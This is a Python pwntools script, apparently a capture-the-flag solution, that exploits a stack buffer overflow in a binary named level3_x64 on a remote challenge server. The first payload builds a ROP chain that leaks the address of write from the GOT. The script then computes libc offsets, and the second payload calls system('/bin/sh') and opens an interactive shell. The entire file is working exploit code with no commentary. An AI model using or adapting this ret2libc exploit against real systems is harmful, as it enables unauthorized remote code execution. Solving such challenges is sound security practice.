from pwn import *

elf  = ELF("./level3_x64")
libc = ELF("./libc-2.19.so")
conn  = remote("pwn2.jarvisoj.com","9883")

write_plt = elf.plt['write']
write_got = elf.got['write']
vulfunc_addr = elf.symbols['vulnerable_function']
pop_rdi = 0x4006b3
pop_rsi  = 0x4006b1

payload1 = 'a'  * 0x88 + p64(pop_rdi) + p64(1)  + p64(pop_rsi) + p64(write_got) + "deadbeef"  + p64(write_plt) + p64(vulfunc_addr)

conn.recvuntil("Input:\n")
conn.send(payload1) 

write_addr = u64(conn.recv(8))
offset  = write_addr - libc.symbols['write']
system_addr  = offset + libc.symbols['system']
bin_sh = offset + libc.search('/bin/sh').next()


payload2 = 'a' * 0x88 + p64(pop_rdi) + p64(bin_sh) + p64(system_addr) + "deadbeef" 

conn.send(payload2)
conn.interactive()